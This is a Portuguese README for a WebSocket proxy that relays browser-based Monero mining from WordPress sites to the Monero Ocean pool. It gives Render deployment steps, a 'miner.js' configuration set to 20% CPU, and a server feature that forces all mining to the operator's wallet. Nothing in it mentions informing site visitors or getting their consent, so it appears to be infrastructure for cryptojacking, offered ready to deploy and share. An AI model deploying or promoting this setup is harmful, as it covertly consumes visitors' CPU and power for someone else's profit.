# 🔒 Monero Ocean Proxy Server (Seguro)

Proxy WebSocket que conecta navegadores ao pool Monero Ocean com **wallet controlada pelo servidor**.

## 🛡️ Segurança

**Todas as minerações vão para SUA wallet**, independente do que for enviado pelo cliente.

### Como funciona:

```javascript
// Cliente envia (pode ser qualquer coisa):
{
  wallet: "abc123...";
}

// Servidor SOBRESCREVE com SUA wallet:
{
  wallet: "49WSEYsxMnCH...";
} // ← Sempre sua!
```

✅ **Seguro para distribuir** - Amigos não conseguem desviar mineração  
✅ **Controle total** - Wallet definida no servidor (Render)  
✅ **Público no GitHub** - Sem dados sensíveis expostos

---

## 🚀 Deploy no Render

### 1. Faça fork ou clone este repositório

### 2. No Render.com:

1. **New +** → **Web Service**
2. Conecte este repositório
3. Configure:
   - **Build Command:** `npm install`
   - **Start Command:** `npm start`
   - **Instance Type:** Free

### 3. Configure Variável de Ambiente:

**Important!** No Render Dashboard:

```
Settings → Environment
Add Environment Variable:

Key:   WALLET
Value: SUA_CARTEIRA_MONERO_AQUI
```

### 4. Deploy!

Copie a URL: `https://seu-app.onrender.com`

---

## 🌐 Configure o miner.js

Nos sites WordPress, atualize:

```javascript
const CONFIG = {
  wallet: "qualquer-coisa", // ← Não importa! Servidor sobrescreve
  proxyUrl: "wss://seu-app.onrender.com", // ← Sua URL do Render
  cpuUsage: 0.2,
};
```

---

## 💻 Teste Local

```bash
# Instale dependências
npm install

# Configure sua wallet
export WALLET="49WSEYsxMnCH..."

# Inicie o servidor
npm start
```

Você verá:

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✓ Monero Ocean Proxy Server
✓ Porta: 8181
✓ Pool: gulf.moneroocean.stream:10128
✓ Modo: DEVELOPMENT
🔒 Wallet: 49WSEYsxMnCH...e9sjBMXx
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

## 📊 Logs

O servidor mostra quando clientes tentam usar wallets diferentes:

```
→ Cliente #1 conectado de 192.168.1.1
⚠️  Cliente #1 tentou usar wallet diferente (ignorado)
✓ Cliente #1 conectado ao pool Monero Ocean
💰 Minerando para: 49WSEYsxMnCH...
```

---

## 🔐 Variáveis de Ambiente

| Variável   | Padrão      | Descrição                                         |
| ---------- | ----------- | ------------------------------------------------- |
| `WALLET`   | Hardcoded   | **OBRIGATÓRIO em produção** - Sua wallet Monero   |
| `PORT`     | 8181        | Porta do servidor (Render define automaticamente) |
| `NODE_ENV` | development | `production` para produção                        |

---

## 📦 Arquivos

```
proxy/
├── proxy-server.js   # Servidor com segurança
├── package.json      # Dependências
├── .env.example      # Exemplo de variáveis
├── .gitignore        # Ignora .env
└── README.md         # Esta documentação
```

---

## ⚠️ Importante

- ❌ **NÃO** commite arquivo `.env` no Git
- ✅ **SIM** configure `WALLET` no Render/Railway como variável de ambiente
- ✅ Sua wallet fica **secreta** (não aparece no código público)

---

## 🎯 Resumo de Segurança

| Item                   | Segurança                   |
| ---------------------- | --------------------------- |
| Wallet hardcoded       | ✅ Controlada pelo servidor |
| Cliente tenta mudar    | ❌ Ignorado automaticamente |
| Público no GitHub      | ✅ Sem dados sensíveis      |
| Distribuir para amigos | ✅ Totalmente seguro        |

---

**Deploy agora:** [![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy)
